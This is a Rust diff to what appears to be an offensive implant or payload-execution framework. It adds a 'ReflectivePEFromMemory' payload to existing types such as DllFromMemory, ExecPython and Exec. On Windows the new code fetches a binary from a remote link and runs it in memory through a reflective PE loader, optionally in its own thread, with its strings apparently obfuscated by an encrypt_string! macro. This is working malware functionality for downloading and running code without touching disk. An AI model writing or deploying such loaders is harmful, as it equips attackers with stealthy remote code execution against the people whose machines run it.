@@ -18,6 +18,9 @@ type DllEntryPoint = extern "C" fn() -> c_int;
 use crate::python_embedder;
 #[cfg(target_os = "windows")]
 use std::mem;
+#[cfg(target_os = "windows")]
+use rspe::reflective_loader;
+
 
 use anyhow::Result;
 use serde::{Deserialize, Serialize};
@@ -41,12 +44,13 @@ pub enum PayloadExecThread {
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub enum Payload {
-    DllFromMemory(DllFromMemory),
-    ExecPython(ExecPython),
     Banner(),
-    WriteZip(WriteZip),
     WriteFile(WriteFile),
+    WriteZip(WriteZip),
     Exec(Exec),
+    ExecPython(ExecPython),
+    DllFromMemory(DllFromMemory),
+    ReflectivePEFromMemory(ReflectivePEFromMemory),
 }
 impl Payload {
     pub fn exec_payload(&self, config: &Config) -> PayloadExecThread {
@@ -57,6 +61,7 @@ impl Payload {
             Payload::Exec(payload) => payload.exec_file(),
             Payload::ExecPython(payload) => payload.exec_python_with_embedder(),
             Payload::DllFromMemory(payload) => payload.dll_from_memory(config),
+            Payload::ReflectivePEFromMemory(payload) => payload.reflective_pe_from_memory(config),
         };
 
         match exec_result {
@@ -106,6 +111,7 @@ impl Payload {
             Payload::Exec(payload) => payload.runonce,
             Payload::ExecPython(payload) => payload.runonce,
             Payload::DllFromMemory(payload) => payload.runonce,
+            Payload::ReflectivePEFromMemory(payload) => payload.runonce,
         }
     }
 
@@ -347,5 +353,45 @@ impl Exec {
             //let _hello: Vec<u8> = output.stdout;
                 return Ok(PayloadExecThread::NoThread());
         };
+    }
+}
+
+
+#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+pub struct ReflectivePEFromMemory {
+    pub link: Link,
+    pub thread: bool,
+    pub runonce: bool,
+}
+
+impl ReflectivePEFromMemory {
+    #[cfg(target_os = "linux")]
+    pub fn reflective_pe_from_memory(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
+        fail_linux_message(format!("{}", encrypt_string!("ReflectivePEFromMemory")));
+        Ok(PayloadExecThread::NoThread())
+    }
+
+    #[cfg(target_os = "windows")]
+    pub fn reflective_pe_from_memory(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
+        let data: Vec<u8> = self.link.fetch_data(config)?;
+
+        if self.thread {
+            let thread = thread::spawn(move || {
+                info!("{}", encrypt_string!("ReflectivePEFromMemory"));
+                unsafe {
+                    reflective_loader(data.clone());
+                };
+            });
+            return Ok(PayloadExecThread::Thread(
+                    thread,
+                    Payload::ReflectivePEFromMemory(self.clone()),
+            ));
+        } else {
+            info!("{}", encrypt_string!("ReflectivePEFromMemory"));
+            unsafe {
+                reflective_loader(data.clone());
+            };
+            return Ok(PayloadExecThread::NoThread());
+        }
     }
 }
